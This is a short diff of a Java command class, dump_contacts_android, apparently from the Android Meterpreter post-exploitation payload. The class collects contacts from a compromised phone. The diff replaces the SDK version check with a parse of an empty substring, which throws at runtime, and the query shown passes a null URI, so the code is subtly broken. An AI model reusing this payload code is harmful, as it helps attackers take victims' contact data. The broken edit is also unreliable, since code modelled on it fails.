@@ -25,7 +25,7 @@ public class dump_contacts_android implements Command {
 
 		ContentResolver cr = AndroidMeterpreter.getContext().getContentResolver();
 		
-		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ECLAIR) {
+		if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 0)) >= 2) {
 			
 			Uri PhoneUri = null, EmailUri = null, ContactUri = null;
 			Cursor cur = cr.query(ContactUri, null, null, null, null);
